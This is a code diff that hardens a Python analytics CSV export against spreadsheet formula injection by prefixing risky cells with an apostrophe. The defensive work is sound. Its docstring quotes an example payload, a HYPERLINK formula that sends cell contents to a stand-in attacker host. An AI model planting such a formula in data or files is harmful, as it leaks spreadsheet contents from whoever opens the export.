@@ -32,6 +32,36 @@ COLUMNS = ("day", "dimension", "value", "visitors", "pageviews", "bounces", "rev
 CHUNK = 1_000
 
 
+# Characters a spreadsheet reads as the start of a formula rather than as text.
+# Tab and carriage return are in the list because some importers strip them and
+# then act on whatever was behind them.
+FORMULA_LEAD = ("=", "+", "-", "@", "\t", "\r")
+
+
+def _defused(value: Any) -> Any:
+    """Stop a cell from being executed by the program that opens this file.
+
+    Every dimension value in this export is chosen by a visitor. A campaign tag
+    of ``=HYPERLINK("http://evil.test/?"&A1,"sale")`` needs no access beyond
+    loading a page on the site being measured -- it survives every gate the
+    collector has, because the URL carrying it really is on that site -- and
+    then waits in the analytics until the owner opens their export, where it
+    runs as them. Quoting does not help: Excel strips the quotes and runs it
+    anyway, which is why ``csv.writer`` alone was never enough.
+
+    An apostrophe is Excel's own marker for "this cell is text". It consumes it
+    and shows the original, so the person the file is for sees what the visitor
+    actually sent. A plain reader keeps the extra character, which is the
+    cheaper of the two costs by a distance.
+
+    Numbers are left alone: they cannot lead with one of these, and a stray
+    apostrophe would turn a count into a string for every reader downstream.
+    """
+    if isinstance(value, str) and value.startswith(FORMULA_LEAD):
+        return f"'{value}"
+    return value
+
+
 class _Line:
     """csv.writer needs a file; this hands back one row at a time instead.
 
@@ -45,7 +75,7 @@ class _Line:
         self._writer = csv.writer(self._buffer, lineterminator="\n")
 
     def of(self, values: Any) -> str:
-        self._writer.writerow(values)
+        self._writer.writerow([_defused(v) for v in values])
         line = self._buffer.getvalue()
         self._buffer.seek(0)
         self._buffer.truncate(0)
